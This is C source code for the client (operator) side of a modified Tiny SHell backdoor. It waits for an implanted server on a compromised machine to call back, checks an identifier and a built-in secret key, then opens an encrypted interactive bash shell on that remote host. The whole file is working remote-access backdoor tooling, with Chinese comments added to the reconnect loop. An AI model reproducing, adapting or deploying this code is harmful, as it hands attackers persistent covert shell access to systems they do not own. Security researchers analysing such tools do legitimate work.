/*
 * Tiny SHell version 0.6 - client side,
 * by Christophe Devine <devine@cr0.net>;
 * this program is licensed under the GPL.
 */

 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <sys/ioctl.h>
 #include <termios.h>
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>
 #include <stdbool.h>
 #include <stdio.h>
 #include <fcntl.h>
 #include <netdb.h>
 
 #include "tsh.h"
 #include "pel.h"
 
 unsigned char message[BUFSIZE + 1];
 
 /* function declaration */
 int tsh_runshell( int server, char *argv2 );
 
 void pel_error( char *s );
 
 /* program entry point */
 
 int main( int argc, char *argv[] )
 {
     int ret, client, server, n;
     struct sockaddr_in server_addr;
     struct sockaddr_in client_addr;
     struct hostent *server_host;
     char expected_id[MAX_ID_LENGTH + 1] = {0};
 
     char password[128] = {0};
     memcpy(password, secret, strlen(secret));
 
     if (argc < 2) {
         fprintf(stderr, "Usage: %s <host/cb> [identifier]\n", argv[0]);
         return 1;
     }
 
     if (argc != 2) {
         fprintf(stderr, "Usage in callback mode: %s cb <identifier>\n", argv[0]);
         return 1;
     }
     if (strlen(argv[1]) != MAX_ID_LENGTH) {
         fprintf(stderr, "Identifier must be exactly %d characters\n", MAX_ID_LENGTH);
         return 1;
     }
     strncpy(expected_id, argv[1], MAX_ID_LENGTH);
 
 connect:
 
     /* create a socket */
 
     client = socket( AF_INET, SOCK_STREAM, 0 );
 
     if( client < 0 )
     {
         perror( "socket" );
         return( 5 );
     }
 
     /* bind the client on the port the server will connect to */
 
     n = 1;
 
     ret = setsockopt( client, SOL_SOCKET, SO_REUSEADDR,
                         (void *) &n, sizeof( n ) );
 
     if( ret < 0 )
     {
         perror( "setsockopt" );
         return( 6 );
     }
 
     client_addr.sin_family      = AF_INET;
     client_addr.sin_port        = htons( SERVER_PORT );
     client_addr.sin_addr.s_addr = INADDR_ANY;
 
     ret = bind( client, (struct sockaddr *) &client_addr,
                 sizeof( client_addr ) );
 
     if( ret < 0 )
     {
         perror( "bind" );
         return( 7 );
     }
 
     if( listen( client, 5 ) < 0 )
     {
         perror( "listen" );
         return( 8 );
     }
 
     bool isFrist = true;
 
     while(1) {  // 添加一个无限循环
         if (isFrist) {
             fprintf( stderr, "Waiting for the server to connect...\n" );
             fflush( stderr );
             isFrist = false;
         }
 
         n = sizeof( server_addr );
         server = accept( client, (struct sockaddr *)
                         &server_addr, &n );
         if( server < 0 )
         {
             perror( "accept" );
             continue;  // 如果accept失败，继续等待新连接
         }
 
         // 接收标识符
         char received_id[MAX_ID_LENGTH + 1] = {0};
         ret = recv(server, received_id, MAX_ID_LENGTH, 0);
         if (ret != MAX_ID_LENGTH) {
             // fprintf(stderr, "Failed to receive identifier\n");
             close(server);
             continue;  // 继续等待新连接
         }
 
         // 验证标识符
         if (strncmp(expected_id, received_id, MAX_ID_LENGTH) != 0) {
             // fprintf(stderr, "Invalid identifier received: %s\n", received_id);
             char response = 0;
             send(server, &response, 1, 0);
             close(server);
             continue;  // 继续等待新连接，而不是退出
         }
 
         // 发送成功响应
         char response = 1;
         send(server, &response, 1, 0);
         
         fprintf(stderr, "Connected with correct identifier.\n");
         break;  // 验证成功，跳出循环继续后续操作
     }
 
     close(client);
 
     /* setup the packet encryption layer */
 
     if( password == NULL )
     {
         /* 1st try, using the built-in secret key */
         ret = pel_client_init( server, secret );
 
         if( ret != PEL_SUCCESS )
         {
             close( server );
 
             /* secret key invalid, so ask for a password */
 
             strncpy(password, getpass("Password: "), sizeof(password) - 1);
             password[sizeof(password) - 1] = '\0';  // Ensure null termination
 
             goto connect;
         }
     }
     else
     {
         /* 2nd try, with the user's password */
         ret = pel_client_init( server, password );
         
         memset( password, 0, strlen( password ) );
 
         if( ret != PEL_SUCCESS )
         {
             /* password invalid, exit */
 
             fprintf( stderr, "Authentication failed.\n" );
             shutdown( server, 2 );
             return( 10 );
         }
     }
 
     ret = tsh_runshell( server, "TERM=xterm-256color exec bash -i");
 
     shutdown( server, 2 );
 
     return( ret );
 }
 
 int tsh_runshell( int server, char *argv2 )
 {
     fd_set rd;
     char *term;
     int ret, len, imf;
     struct winsize ws;
     struct termios tp, tr;
 
     /* send the TERM environment variable */
 
     term = getenv( "TERM" );
 
     if( term == NULL )
     {
         term = "vt100";
     }
 
     len = strlen( term );
 
     ret = pel_send_msg( server, (unsigned char *) term, len );
 
     if( ret != PEL_SUCCESS )
     {
         pel_error( "pel_send_msg" );
         return( 22 );
     }
 
     /* send the window size */
 
     imf = 0;
 
     if( isatty( 0 ) )
     {
         /* set the interactive mode flag */
 
         imf = 1;
 
         if( ioctl( 0, TIOCGWINSZ, &ws ) < 0 )
         {
             perror( "ioctl(TIOCGWINSZ)" );
             return( 23 );
         }
     }
     else
     {
         /* fallback on standard settings */
 
         ws.ws_row = 25;
         ws.ws_col = 80;
     }
 
     message[0] = ( ws.ws_row >> 8 ) & 0xFF;
     message[1] = ( ws.ws_row      ) & 0xFF;
 
     message[2] = ( ws.ws_col >> 8 ) & 0xFF;
     message[3] = ( ws.ws_col      ) & 0xFF;
 
     ret = pel_send_msg( server, message, 4 );
 
     if( ret != PEL_SUCCESS )
     {
         pel_error( "pel_send_msg" );
         return( 24 );
     }
 
     /* send the system command */
 
     len = strlen( argv2 );
 
     ret = pel_send_msg( server, (unsigned char *) argv2, len );
 
     if( ret != PEL_SUCCESS )
     {
         pel_error( "pel_send_msg" );
         return( 25 );
     }
 
     /* set the tty to RAW */
 
     if( isatty( 1 ) )
     {
         if( tcgetattr( 1, &tp ) < 0 )
         {
             perror( "tcgetattr" );
             return( 26 );
         }
 
         memcpy( (void *) &tr, (void *) &tp, sizeof( tr ) );
 
         tr.c_iflag |= IGNPAR;
         tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
         tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
         tr.c_oflag &= ~OPOST;
 
         tr.c_cc[VMIN]  = 1;
         tr.c_cc[VTIME] = 0;
 
         if( tcsetattr( 1, TCSADRAIN, &tr ) < 0 )
         {
             perror( "tcsetattr" );
             return( 27 );
         }
     }
 
     /* let's forward the data back and forth */
 
     while( 1 )
     {
         FD_ZERO( &rd );
 
         if( imf != 0 )
         {
             FD_SET( 0, &rd );
         }
 
         FD_SET( server, &rd );
 
         if( select( server + 1, &rd, NULL, NULL, NULL ) < 0 )
         {
             perror( "select" );
             ret = 28;
             break;
         }
 
         if( FD_ISSET( server, &rd ) )
         {
             ret = pel_recv_msg( server, message, &len );
 
             if( ret != PEL_SUCCESS )
             {
                 if( pel_errno == PEL_CONN_CLOSED )
                 {
                     ret = 0;
                 }
                 else
                 {
                     pel_error( "pel_recv_msg" );
                     ret = 29;
                 }
                 break;
             }
             
             if( write( 1, message, len ) != len )
             {
                 perror( "write" );
                 ret = 30;
                 break;
             }
         }
 
         if( imf != 0 && FD_ISSET( 0, &rd ) )
         {
             len = read( 0, message, BUFSIZE );
 
             if( len == 0 )
             {
                 fprintf( stderr, "stdin: end-of-file\n" );
                 ret = 31;
                 break;
             }
 
             if( len < 0 )
             {
                 perror( "read" );
                 ret = 32;
                 break;
             }
 
             ret = pel_send_msg( server, message, len );
 
             if( ret != PEL_SUCCESS )
             {
                 pel_error( "pel_send_msg" );
                 ret = 33;
                 break;
             }
         }
     }
 
     /* restore the terminal attributes */
 
     if( isatty( 1 ) )
     {
         tcsetattr( 1, TCSADRAIN, &tp );
     }
 
     return( ret );
 }
 
 void pel_error( char *s )
 {
     switch( pel_errno )
     {
         case PEL_CONN_CLOSED:
 
             fprintf( stderr, "%s: Connection closed.\n", s );
             break;
 
         case PEL_SYSTEM_ERROR:
 
             perror( s );
             break;
 
         case PEL_WRONG_CHALLENGE:
 
             fprintf( stderr, "%s: Wrong challenge.\n", s );
             break;
 
         case PEL_BAD_MSG_LENGTH:
 
             fprintf( stderr, "%s: Bad message length.\n", s );
             break;
 
         case PEL_CORRUPTED_DATA:
 
             fprintf( stderr, "%s: Corrupted data.\n", s );
             break;
 
         case PEL_UNDEFINED_ERROR:
 
             fprintf( stderr, "%s: No error.\n", s );
             break;
 
         default:
 
             fprintf( stderr, "%s: Unknown error code.\n", s );
             break;
     }
 }
 